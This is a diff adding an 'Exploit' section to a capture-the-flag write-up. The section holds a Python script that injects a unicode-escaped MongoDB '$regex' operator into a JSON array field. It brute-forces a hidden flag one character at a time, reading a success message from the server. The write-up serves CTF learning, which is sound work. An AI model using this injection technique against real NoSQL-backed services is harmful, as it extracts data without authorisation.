@@ -84,6 +84,46 @@ To get the flag I constructed a Python script that tries every letter and number
 
 Running this script (see the exploit.py file in this folder) gives us the complete flag character by character.
 ![alt text](image-5.png)
+
+## Exploit
+
+```python
+import string
+import requests
+
+url = "<site-url>/order"
+
+unicode_char = string.ascii_letters + string.digits + "}"
+flag = "CTF{"
+
+while True:
+    ok = False
+    for char in unicode_char:
+        req = '''
+            {
+    "fruits": [
+        "Grape",
+        "Grape",
+        "Grape",
+        {"\\u0024regex": "^''' + flag + char + '''"},
+        "Grape"
+    ]
+}
+        '''
+        http_res = requests.post(url=url,data=req,headers={"Content-Type": "application/json"})
+        response = http_res.json().get("message","")
+        print(f"{flag + char}, {response}")
+        if(response == "Enjoy your salad!"):
+            flag+=char
+            ok = True
+            print(f'Partial flag : {flag}')
+            if(char == "}"):
+                print(f'Flag found: {flag}')
+                exit(0)
+            break
+
+```
+
 ## Key Takeaways
 1. The hint ("mango") pointed to MongoDB/NoSQL injection
 2. Understanding the response behavior was crucial (5 fruits vs fewer)
